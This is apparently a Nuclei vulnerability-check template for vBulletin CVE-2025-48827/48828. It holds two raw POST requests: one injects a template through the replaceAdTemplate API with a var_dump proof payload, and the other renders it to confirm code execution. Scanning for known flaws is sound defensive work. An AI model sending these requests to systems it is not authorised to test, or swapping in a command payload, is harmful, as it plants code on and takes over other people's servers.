id: vBulletin-CVE-2025-48827(48828)-CodeExecution

info:
  name: vBulletin-CVE-2025-48827(48828)-CodeExecution
  author: iSee857
  severity: critical
  description: |
    vBulletin-CVE-2025-48827(48828)-CodeExecution.

variables:
  rand_string: "{{to_lower(rand_base(5))}}"
  rand_value: "{{to_lower(rand_text_alpha(5))}}"

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        routestring=ajax/api/ad/replaceAdTemplate&styleid=1&location={{rand_string}}&template=<vb:if condition='"var_dump"("{{rand_value}}")'></vb:if>
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'string(5)','{{rand_value}}')
        condition: and

  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        routestring=ajax/render/ad_{{rand_string}}
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'string(5)','{{rand_value}}')
        condition: and